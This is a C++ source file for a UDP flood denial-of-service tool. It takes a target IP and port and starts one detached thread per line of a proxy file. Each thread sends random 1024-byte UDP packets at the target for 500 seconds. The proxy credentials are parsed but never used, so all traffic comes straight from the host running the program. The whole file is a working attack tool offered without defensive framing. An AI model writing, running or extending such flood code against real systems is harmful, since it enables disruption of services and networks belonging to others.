#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fstream>
#include <sstream>
#include <chrono>
#include <ctime>
#include <cstdlib>

struct Proxy {
    std::string ip;
    int port;
    std::string user;
    std::string pass;
    bool auth;
};

std::vector<Proxy> load_proxies(const std::string& filename) {
    std::vector<Proxy> proxies;
    std::ifstream file(filename);
    std::string line;
    while (std::getline(file, line)) {
        if (line.empty()) continue;
        std::stringstream ss(line);
        std::string part;
        std::vector<std::string> parts;
        while (std::getline(ss, part, ':')) parts.push_back(part);
        
        if (parts.size() >= 2) {
            Proxy p;
            p.ip = parts[0];
            p.port = std::stoi(parts[1]);
            if (parts.size() == 4) {
                p.user = parts[2];
                p.pass = parts[3];
                p.auth = true;
            } else {
                p.auth = false;
            }
            proxies.push_back(p);
        }
    }
    return proxies;
}

void flood(std::string target_ip, int target_port) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip.c_str(), &target.sin_addr);

    if (connect(sock, (struct sockaddr*)&target, sizeof(target)) < 0) {
        close(sock);
        return;
    }

    char buffer[1024];
    for (int i = 0; i < 1024; i++) {
        buffer[i] = rand() % 256;
    }

    auto start = std::chrono::steady_clock::now();
    while (std::chrono::steady_clock::now() - start < std::chrono::seconds(500)) {
        if (send(sock, buffer, sizeof(buffer), 0) < 0) {
            break; 
        }
    }
    close(sock);
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cout << "Usage: ./lib [ip] [port]" << std::endl;
        return 1;
    }
    
    std::string target_ip = argv[1];
    int target_port = std::stoi(argv[2]);
    auto proxies = load_proxies("proxy.txt");

    srand(time(0));

    for (const auto& p : proxies) {
        std::thread t(flood, target_ip, target_port);
        t.detach();
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    std::cout << "Attack sequence initialized across " << proxies.size() << " threads..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(5));
    return 0;
}
